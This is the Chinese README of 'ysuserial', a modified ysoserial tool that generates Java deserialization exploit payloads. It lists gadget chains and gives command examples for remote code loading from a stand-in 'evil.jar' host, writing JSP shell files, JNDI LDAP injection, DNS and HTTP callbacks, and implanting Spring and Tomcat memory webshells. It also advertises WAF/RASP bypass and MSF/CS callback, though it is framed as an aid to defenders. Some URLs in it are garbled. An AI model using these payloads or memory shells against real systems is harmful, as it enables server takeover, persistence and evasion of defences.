[ ysuserial ]
某⾏动在即，为助⼒在⼀线防守的伙伴，特发此⾃⽤项⽬，帮助伙伴们更⾼效、更快速的针对 Java 反序列化漏洞进⾏⾃检及安全修复。
本项⽬为 ysoserial [su18] 专版，取名为 ysuserial ，在原项⽬ ysoserial 基础上魔改⽽来，主要有以下新添加功能：
1. 基础链版本的覆盖：原版反序列化链可能仅限于某⼏个版本，本项⽬添加了如 CB/C3P0 等链的低版本，可⼀键 getshell 的版本
覆盖更⼴；
2. 利⽤链的扩充和丰富：在原版基础上添加了多条利⽤链，扩展利⽤⽅式，更够在依赖不确定、利⽤⽅式有限制的情况扩展更多的攻击
路径；
3. 利⽤⽅式的填充：原版的利⽤链的利⽤⽅式仅使⽤了 Runtime 执⾏系统命令，本项⽬添加了多种利⽤⽅式，并⽀持执⾏⾃定义任意
代码；
4. 利⽤链探测：本项⽬在 URLDNS 中添加了利⽤链的探测，在攻击中不再盲⽬乱打，先通过 DNSLOG 检测类名，再执⾏攻击；
5. 内存⻢：本项⽬在利⽤时，对于部分链⽀持了⼀键打⼊ Spring/Tomcat 内存⻢功能，内存⻢⽀持命令执⾏、冰蝎、哥斯拉三种利⽤
⽅式；并⽀持 Tomcat 回显命令执⾏、Neoreg 流量隧道内存⻢；
6. 防御绕过：在部分系统中使⽤了 WAF/RASP 等防御模式，本项⽬去除⼤多数原版特征，并在执⾏恶意动作时使⽤了多种能够绕过
RASP 的执⾏⽅式，绕过防护；
7. MSF/CS 上线：配合远程 Jar 包⼀键上线 MSF/CS 的功能，集成⼀体，快⼈⼀步。
项⽬⽀持利⽤链展示：
$ java -jar ysuserial-0.1-su18-all.jar
            _.-^^""#....,,"$
       _"$                  "$_
      )
      |       Y Su Serial ?     |
       \._                   _./
          ```"$. . , ; ."$'''
                | |   |
             .-="&  | "'-.
             `-=#$%&%$"(-'
                | ;  :|
       _____.,-#%&$@%#&#~,._____
     _____.,[ 暖⻛熏得游⼈醉 ],._____
     _____.,[ 只把杭州作汴州 ],._____
[root")~  A Mind-Blowing Tool Collected By [ PI:EMAIL ]
[root")~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei
[root")~  AND OF COURSE TO THE All MIGHTY @frohoff
[root")~  Usage: java -jar ysuserial-0.1-su18-all.jar [payload] '[command]'
[root")~  Available payload types:
Jun 19, 2022 11:54:53 PM org.reflections.Reflections scan
INFO: Reflections took 195 ms to scan 1 urls, producing 26 keys and 230 values
     Payload                  Authors                                Dependencies
     -------                  -------                                ------------
     AspectJWeaver            @Jang                                  aspectjweaver:1.9.2, commons-
collections:3.2.2
     BeanShell1               @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                     @mbechler                              c3p0:0.9.5.2, mchange-commons-
java:0.2.11
     C3P092                   @mbechler                              c3p0:0.9.2-pre2-RELEASE ~ 
0.9.5-pre8, mchange-commons-java:0.2.11
     Click1                   @artsploit                             click-nodeps:2.3.0, 
javax.servlet-api:3.1.0
     Clojure                  @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1        @frohoff                               commons-beanutils:1.9.2, 
commons-collections:3.1, commons-logging:1.2
     CommonsBeanutils1183NOCC                                        commons-beanutils:1.8.3
     CommonsBeanutils2                                               commons-beanutils:1.9.2
     CommonsBeanutils2NOCC                                           commons-beanutils:1.8.3, 
commons-logging:1.2
     CommonsBeanutils3                                               commons-beanutils:1.9.2, 
commons-collections:3.1
     CommonsBeanutils3183                                            commons-beanutils:1.9.2, 
commons-collections:3.1, commons-logging:1.2
     CommonsCollections1      @frohoff                               commons-collections:3.1
     CommonsCollections2      @frohoff                               commons-collections4:4.0
     CommonsCollections3      @frohoff                               commons-collections:3.1
     CommonsCollections4      @frohoff                               commons-collections4:4.0
     CommonsCollections5      @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6      @matthias_kaiser                       commons-collections:3.1
     CommonsCollections6Lite  @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7      @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     CommonsCollections8      @navalorenzo                           commons-collections4:4.0
     CommonsCollections9                                             commons-collections:3.2.1
     FileUpload1              @mbechler                              commons-fileupload:1.3.1, 
commons-io:2.4
     Groovy1                  @frohoff                               groovy:2.3.9
     Hibernate1               @mbechler
     Hibernate2               @mbechler
     JBossInterceptors1       @matthias_kaiser                       javassist:3.12.1.GA, jboss-
interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-
spi:2.0.0.Final, slf4j-api:1.7.21
     JRE8u20                  @frohoff
     JRMPClient               @mbechler
     JRMPClient_Activator     @mbechler
     JRMPClient_Obj           @mbechler
     JRMPListener             @mbechler
     JSON1                    @mbechler                              json-lib:jar:jdk15:2.4, spring-
aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-
beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1           @matthias_kaiser                       javassist:3.12.1.GA, weld-
core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, 
slf4j-api:1.7.21
     Jdk7u21                  @frohoff
     Jython1                  @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1            @matthias_kaiser                       js:1.7R2
     MozillaRhino2            "*tint0                                js:1.7R2
     Myfaces1                 @mbechler
     Myfaces2                 @mbechler
     ROME                     @mbechler                              rome:1.0
     Spring1                  @frohoff                               spring-core:4.1.4.RELEASE, 
spring-beans:4.1.4.RELEASE
     Spring2                  @mbechler                              spring-core:4.1.4.RELEASE, 
spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     Spring3                                                         spring-tx:5.2.3.RELEASE, 
spring-context:5.2.3.RELEASE, javax.transaction-api:1.2
     URLDNS                   @gebl
     Vaadin1                  @kai_ullrich                           vaadin-server:7.7.14, vaadin-
shared:7.7.14
     Wicket1                  @jacob-baines                          wicket-util:6.23.0, slf4j-
api:1.6.4
利⽤⽅式
在原版的利⽤⽅式中，对于使⽤ TemplatesImpl 的利⽤⽅式，仅使⽤了单⼀的 java.lang.Runtime.getRuntime().exec()
执⾏任意命令；对于使⽤ ChainedTransformer 的利⽤⽅式，也是仅 chain 了⼀个 Runtime exec，再漏洞利⽤上过于局限且单
⼀，因此本项⽬在原版项⽬基础上扩展了不同的利⽤⽅式以供在实战环境中根据情况选择。
针对 ChainedTransformer
对于本项⽬中的 CommonsCollections1、CommonsCollections5、CommonsCollections6、CommonsCollections6Lite、
CommonsCollections7、CommonsCollections9，均为使⽤了 ChainedTransformer 进⾏链式反射调⽤的利⽤⽅式，针对 CC
3.1-3.2.1 的依赖。
本项⽬为其拓展了除了 Runtime 执⾏命令意外的多种利⽤⽅式，具体如下：
TS ：Thread Sleep - 通过 Thread.sleep()  的⽅式来检查是否存在反序列化漏洞，使⽤命令： TS-10
RC ：Remote Call - 通过 URLClassLoader.loadClass()  来调⽤远程恶意类并初始化，使⽤命令： RC-
http:"+xxxx.com/evil.jar#EvilClass
WF ：Write File - 通过 FileOutputStream.write()  来写⼊⽂件，使⽤命令： WF-/tmp/shell#d2hvYW1p
PB ：ProcessBuilder 通过 ProcessBuilder.start()  来执⾏系统命令，使⽤命令 PB-lin-d2hvYW1p  / PB-win-
d2hvYW1p  分别在不同操作系统执⾏命令
SE ：ScriptEngine - 通过 ScriptEngineManager.getEngineByName('js').eval()  来解析 JS 代码调⽤ Runtime
执⾏命令，使⽤命令 SE-d2hvYW1
DL ：DNS LOG - 通过 InetAddress.getAllByName()  来触发 DNS 解析，使⽤命令 DL-xxxdnslog.cn
HL ：HTTP LOG - 通过 URL.getContent()  来触发 HTTP LOG，使⽤命令 HL-http:"+xxx.com
BC ：BCEL Classloader - 通过 ",bcel""-ClassLoader.loadClass().newInstance()  来加载 BCEL 类字节码，使⽤
命令 BC-$BCEL$xxx
JD ：JNDI Lookup - 通过 InitialContext.lookup()  来触发 JNDI 注⼊，使⽤命令 JD-ldap:"+xxx/xx
其他：普通命令执⾏ - 通过 Runtime.getRuntime().exec()  执⾏系统命令，使⽤命令 whoami
⽬前只针对 CC 3.1-3.2.1 使⽤了 ChainedTransformer，对于 CC 4.0 还是使⽤了 TemplatesImpl 的传统利⽤⽅式。
这⾥需要注意的是，使⽤ PB 执⾏系统命令、WF 写⼊⽂件的内容、SE 执⾏命令时，为了防⽌传参错误，需要对传⼊的命令使⽤
base64 编码。
命令执⾏示例：
效果图：
java -jar ysuserial-0.1-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA".
DNSLOG示例：
效果图：
脚本引擎解析 JS 代码示例：
java -jar ysuserial-0.1-su18-all.jar CommonsCollections1 'DL-xxx.org'
java -jar ysuserial-0.1-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA".'
效果图：
⽂件写⼊示例：
效果图：
java -jar ysuserial-0.1-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
触发 JNDI 查询注⼊示例：
效果图：
java -jar ysuserial-0.1-su18-all.jar CommonsCollections1 'JD-
ldap:"+127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA".'
普通命令执⾏示例：
效果图：
针对 TemplatesImpl
针对本项⽬中的 Click1、CommonsBeanutils1、CommonsBeanutils2、CommonsBeanutils1183NOCC、
CommonsBeanutils2183NOCC、CommonsCollections2、CommonsCollections3、CommonsCollections4、
CommonsCollections8、Hibernate1、JavassistWeld1、JBossInterceptors1、Jdk7u21、JRE8u20、JSON1、
MozillaRhino1、MozillaRhino2、ROME、Spring1、Spring2、Vaadin1，均为使⽤ TemplatesImpl 加载恶意的类字节码的利⽤
⽅式，原版仅使⽤了 Runtime 的命令执⾏⽅式，这⾥对其进⾏深度的扩展，并植⼊了多种内存⻢的功能。
扩展攻击-内存⻢及回显
如果使⽤这些利⽤链进⾏攻击，本项⽬内置了⼀些⾼级扩展⽤法，命令均使⽤ EX-  开头，具体如下：
命令 EX-SpringInterceptorMS ：向系统内植⼊ Spring 拦截器类型的内存⻢
命令 EX-TFMSFromJMX ：利⽤ JMX MBeans 向系统内植⼊ Tomcat Filter 型内存⻢
命令 EX-TFMSFromThread ：通过线程类加载器获取指定上下⽂向系统内植⼊ Tomcat Filter 型内存⻢
命令 EX-TLMSFromThread ：通过线程类加载器获取指定上下⽂向系统内植⼊ Tomcat Listener 型内存⻢
命令 EX-TLNeoRegFromThread ：通过线程类加载器获取指定上下⽂向系统内植⼊ NeoReg 流量隧道型内存⻢
命令 EX-TomcatEcho ：通过在线程中遍历获取当前 request 来执⾏命令并回显
命令 EX-TSMSFromJMX ：利⽤ JMX MBeans 向系统内植⼊ Tomcat Servlet 型内存⻢
命令 EX-TSMSFromThread ：通过线程类加载器获取指定上下⽂系统内植⼊ Tomcat Servlet 型内存⻢
这⾥就不⼀⼀测试截图了，欢迎⼤家进⾏测试，如果问题请按⽂档最后的联系⽅式联系我。
java -jar ysuserial-0.1-su18-all.jar CommonsCollections1 'open -a Calculator.app'